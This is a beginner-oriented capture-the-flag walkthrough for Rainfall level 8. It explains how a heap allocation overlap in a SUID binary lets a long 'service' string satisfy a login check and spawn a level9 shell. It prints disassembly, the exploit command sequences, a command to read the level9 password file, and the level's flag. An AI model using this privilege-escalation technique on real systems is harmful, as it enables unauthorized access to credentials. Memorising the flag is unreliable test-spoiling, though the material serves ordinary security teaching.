# 🎯 Rainfall — Level 8 Complete Guide

> **For beginners — explained like you are 12 years old, step by step.**

---

## 🧒 Simple explanation (like you are 12)

Imagine a program that acts like a **security guard with a notebook**.
You can give it 4 commands:

| Command | What the guard does |
|---------|-------------------|
| `auth NAME` | Guard reserves a **tiny box (4 bytes)** and writes your name in it |
| `reset` | Guard **erases** the box completely |
| `service TEXT` | Guard writes your text in a **new box right next door** |
| `login` | Guard checks **position 32 of the notebook** — if something is written there → opens the door (shell!) |

The trick: the guard checks position 32 **starting from where `auth` was written**.
But `auth` is only **4 bytes** long!

So positions 5 through 35 are **outside the auth box** — they belong to whatever
was allocated right next door — which is `service`!

If we fill `service` with enough text, it reaches position 32 of `auth` → non-zero → shell opens!

This is called a **Heap Logic Bug / Use-After-Allocation Overlap**.

---

## 🔬 How the program works in C

```c
char *service;   // global pointer — holds address of service box
char *auth;      // global pointer — holds address of auth box

int main() {
    char buff[128];   // your typed input goes here (stack)

    while (1) {
        // Print current addresses of both pointers every loop
        printf("%p, %p \n", service, auth);

        // Read your input (safe — max 128 bytes)
        if (fgets(buff, 128, stdin) == 0)
            break;

        // Command 1: "auth "
        if (strncmp(buff, "auth ", 5) == 0) {
            auth = malloc(4);          // ← only 4 bytes allocated!
            auth[0] = 0;
            if (strlen(&buff[5]) <= 30) {
                strcpy(auth, &buff[5]); // copy name into auth box
            }
        }

        // Command 2: "reset"
        if (strncmp(buff, "reset", 5) == 0) {
            free(auth);                // delete the auth box
        }

        // Command 3: "service"
        if (strncmp(buff, "service", 6) == 0) {
            service = strdup(&buff[7]); // ← new heap box right after auth!
        }

        // Command 4: "login" ← THE VULNERABILITY IS HERE
        if (strncmp(buff, "login", 5) == 0) {
            if (auth[32] != 0) {       // ← checks auth+32, but auth is only 4 bytes!
                system("/bin/sh");     // ← THE PRIZE
            } else {
                fwrite("Password:\n", 10, 1, stdout);
            }
        }
    }
}
```

### Key observations from the C code

- `auth` is allocated with only **4 bytes** via `malloc(4)` — extremely small
- `service` is allocated with `strdup()` — goes to heap **right next to auth**
- The `login` check reads `auth[32]` — but auth only owns bytes 0-3!
- Bytes 4 through 35 of `auth` are **heap memory belonging to service**
- If `service` has data at the right offset, `auth[32]` is non-zero → shell!
- The program **loops forever** — you type multiple commands one by one

---

## 🕵️ The full investigation story — how we deduced everything

### Phase 1 — First contact: what is this program?

```bash
ls -l
# -rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
```

The `s` = **SUID bit**. Runs as level9. Worth exploiting.

```bash
./level8
# (nil), (nil)
```

It prints two `nil` values and waits. No crash, no "Nope" — it's **interactive**.
This is different from previous levels. It wants commands, not just one input.

```bash
hello
# (nil), (nil)
test
# (nil), (nil)
```

It keeps looping and printing those two pointers. The pointers are `nil` — nothing allocated yet.
We need to figure out what commands it accepts.

---

### Phase 2 — Static analysis: reading the PLT toolbox

```asm
08048410 <printf@plt>
08048420 <free@plt>
08048430 <strdup@plt>
08048440 <fgets@plt>
08048450 <fwrite@plt>
08048460 <strcpy@plt>
08048470 <malloc@plt>
08048480 <system@plt>
```

Eight tools. The critical combination:
- `malloc` + `free` + `strdup` → **heap management** → memory layout matters
- `system` → **the prize** — somewhere this gets called
- `strcpy` → **dangerous copy** — possible overflow
- `fgets` → safe input reading — overflow NOT here

Seeing `malloc(4)` (tiny!) + `strdup` + `system` together screams:
**heap overlap / logic bug** — the vulnerability is in how memory is arranged,
not in a classic overflow.

---

### Phase 3 — Reading main() line by line

**The loop and printf:**

```asm
8048575: mov ecx, ds:0x8049ab0    ← load "service" global pointer
804857b: mov edx, ds:0x8049aac    ← load "auth" global pointer
8048591: call printf@plt          ← print both as "%p, %p \n"
```

Every iteration prints where `auth` and `service` live in memory.
This is our **live map** — we can see exactly what is happening.

**The fgets input:**

```asm
80485a7: lea eax, [esp+0x20]      ← buff (128 bytes on stack)
80485a7: mov DWORD PTR [esp+0x4], 0x80  ← max 128 bytes
80485ae: call fgets@plt           ← safe read
```

Safe. No overflow here. The bug is **logic**, not memory corruption.

**The "auth " command block:**

```asm
80485c1: mov eax, 0x8048819       ← string "auth "
80485c6: mov ecx, 0x5             ← compare 5 chars
80485cf: repz cmps                ← compare buff vs "auth "
80485e2: jne 8048642              ← not "auth "? skip

80485e4: mov DWORD PTR [esp], 0x4 ← argument: 4
80485eb: call malloc@plt          ← malloc(4) ← ONLY 4 BYTES!
80485f0: mov ds:0x8049aac, eax    ← save into global "auth"
80485fa: mov DWORD PTR [eax], 0x0 ← auth[0] = 0

8048625: cmp eax, 0x1e            ← check length <= 30 (0x1e)
8048628: ja 8048642               ← too long? skip copy
804863d: call strcpy@plt          ← strcpy(auth, &buff[5])
```

Key insight: `malloc(4)` allocates only **4 bytes**.
The name you provide gets copied into those 4 bytes.
If your name is longer than 4 bytes, it already overflows — but that is not the main trick here.

**The "reset" command block:**

```asm
804866b: mov eax, ds:0x8049aac    ← load auth pointer
8048673: call free@plt            ← free(auth) — delete the box
```

Frees the auth allocation. After this, auth points to freed memory.

**The "service" command block:**

```asm
80486a5: add eax, 0x7             ← skip past "service " (7 chars)
80486ab: call strdup@plt          ← strdup(&buff[7]) — NEW heap box
80486b0: mov ds:0x8049ab0, eax    ← save into global "service"
```

`strdup()` allocates a brand new box on the heap and copies your text.
Because `malloc` fills memory sequentially, this new box lands
**right next to the auth box** in memory.

**The "login" command block — THE VULNERABILITY:**

```asm
80486e2: mov eax, ds:0x8049aac    ← load auth pointer
80486e7: mov eax, DWORD PTR [eax+0x20]  ← read auth + 0x20 = auth + 32
80486ea: test eax, eax            ← is it zero?
80486ec: je 80486ff               ← zero? → print "Password:" → loop
80486ee: mov DWORD PTR [esp], 0x8048833
80486f5: call system@plt          ← NOT zero? → system("/bin/sh") ← SHELL!
```

The bug is on this line:
```asm
mov eax, DWORD PTR [eax+0x20]   ← 0x20 = 32 decimal
```

It reads **32 bytes past the start of auth**.
But auth was only allocated **4 bytes**!
Bytes 5 through 35 belong to whatever was allocated next — which is **service**!

---

### Phase 4 — Understanding the heap overlap

When we run the exploit commands, the heap looks like this:

```
HEAP MEMORY:

After "auth A":
  auth  → 0x804a008  [ A\0.. : 4 bytes ]

After "service AAAA...":
  auth    → 0x804a008  [ A\0.. : 4 bytes ] [ heap header: 8 bytes ]
  service → 0x804a018  [ AAAAAAAAAAAAAAAA... ]

auth + 32 = 0x804a008 + 0x20 = 0x804a028

service starts at 0x804a018
service[16] = address 0x804a028  ← exactly auth+32!

So we need service to have at least 16 bytes of data
to make auth[32] non-zero.
```

The distance from service start to auth+32:
```
0x804a028 - 0x804a018 = 0x10 = 16 bytes
```

So we need **at least 16 bytes** in our service command.
Using 32+ bytes gives us a safe margin.

---

### Phase 5 — How we arrived at the exact commands

Let's break down **every line** of the exploit:

```
./level8          ← start the program
```

```
auth A            ← creates the auth box (malloc 4 bytes)
                    "auth " is 5 chars, "A" is our name
                    auth pointer now shows a real address like 0x804a008
```

```
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA   ← 32+ A's
                    "service " is 7 chars
                    strdup allocates a new box right after auth
                    service pointer now shows address like 0x804a018
                    our 32 A's extend from 0x804a018 to 0x804a038
                    this covers auth+32 = 0x804a028 ← non-zero!
```

```
login             ← triggers the check
                    reads auth[32] = address 0x804a028
                    that address is inside service box = 'A' = 0x41 ≠ 0
                    condition passes → system("/bin/sh") executes!
```

**Why do we see the addresses printed?**
The `printf("%p, %p \n", service, auth)` at the start of every loop
shows us the real heap addresses. This is how we confirmed our theory:

```
(nil), (nil)          ← before anything
0x804a008, (nil)      ← after "auth A" — auth box created
0x804a008, 0x804a018  ← after "service AAA..." — service box created next to auth
```

The gap: `0x804a018 - 0x804a008 = 0x10 = 16 bytes`.
So service needs 16+ bytes to reach auth+32. We use 32 to be safe.

---

## ✅ Method 1 — Direct command sequence (simplest)

Run the program and type these commands one by one:

```bash
./level8
```

Then type each line and press Enter:

```
auth A
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
login
```

You get a shell. Then:

```bash
whoami
cat /home/user/level9/.pass
```

---

## ✅ Method 2 — Piped input (automated)

You can pipe all commands at once:

```bash
(echo "auth A"; echo "service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; echo "login"; cat) | ./level8
```

The `cat` at the end keeps stdin open so the shell stays alive.
Then type:

```bash
whoami
cat /home/user/level9/.pass
```

---

## ✅ Method 3 — Using printf for exact bytes

If Method 1 or 2 don't work, use printf to be precise:

```bash
(printf "auth A\n"; printf "service %0.s A" {1..32}; printf "\nlogin\n"; cat) | ./level8
```

---

## 🏁 The flag

```
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

Log in as level9:

```bash
su level9
# password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

---

## 🗺️ Quick reference — all commands in order

```bash
# 1. Confirm SUID
ls -l ./level8
# -rwsr-s---+ 1 level9 users ...

# 2. Start the program
./level8
# (nil), (nil)   ← both pointers are empty

# 3. Create auth box
auth A
# 0x804a008, (nil)   ← auth box created at 0x804a008

# 4. Create service box next to auth
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# 0x804a008, 0x804a018   ← service created 16 bytes after auth

# 5. Trigger login — auth[32] is now inside service box = non-zero
login
# shell opens!

# 6. Get the flag
whoami          # → level9
cat /home/user/level9/.pass
# c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

---

## 📋 The deduction chain — how we solved it step by step

```
1.  Saw SUID bit          → runs as level9 → worth exploiting
2.  Ran the program       → prints (nil),(nil) and waits → interactive loop
3.  Tried random input    → keeps looping → accepts specific commands
4.  Checked PLT           → malloc+free+strdup+system → heap logic bug likely
5.  Found system()        → somewhere this gets called → find the condition
6.  Found malloc(4)       → auth is only 4 bytes → extremely small!
7.  Found strdup()        → service goes to heap right after auth
8.  Found login check     → reads auth+32 → but auth is only 4 bytes!
9.  Key insight           → auth[32] is INSIDE the service box on the heap
10. Calculated overlap    → service starts 16 bytes after auth
11. auth+32 = service+16  → need 16+ bytes in service to make it non-zero
12. Used 32 bytes         → safe margin, definitely covers auth+32
13. Typed 3 commands      → auth, service, login
14. login check passed    → auth[32] = 'A' = 0x41 ≠ 0 → system("/bin/sh")
15. Got shell             → flag retrieved
```

---

## 📚 Key words to remember

| Word | Simple meaning |
|------|----------------|
| Heap | Memory area where malloc/strdup allocate boxes |
| Logic bug | The code does something wrong in its thinking, not just its memory use |
| malloc(4) | Reserve exactly 4 bytes on the heap |
| strdup() | Copy a string into a brand new heap box |
| Heap overlap | Two heap boxes are so close that one's data falls inside the other's range |
| auth[32] | Reading 32 bytes past the start of auth — outside its 4-byte box! |
| (nil) | Pointer is empty — nothing allocated yet |
| %p | Prints a pointer address in hex — used to see where things live |
| SUID | Binary runs with another user's permissions |
| fgets() | Safe input reading with a size limit |
| free() | Returns a heap box back to the system |
| system() | Runs a shell command — the prize in this level |

---

*Guide written for Rainfall project — 1337 school*